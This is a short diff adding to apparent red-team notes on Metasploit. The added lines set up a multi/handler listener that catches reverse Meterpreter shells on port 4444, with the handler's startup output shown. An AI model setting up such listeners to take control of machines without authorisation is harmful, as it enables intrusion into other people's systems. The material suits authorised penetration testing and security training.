@@ -8,6 +8,15 @@ sudo msfconsole
 
 
 
+#Opens meterpreter connect back listener on the RedTeam (Attacker)
+msf5 > use multi/handler
+set LHOST x.x.x.x
+set LPORT 4444
+msf5 exploit(multi/handler) > run
+[*] Started reverse TCP handler on x.x.x.x:4444 
+
+
+
 #When a vulnerability is suppored by Metasploit
 #This will create its own connect back shell run the exploit and start a meterpreter session
 
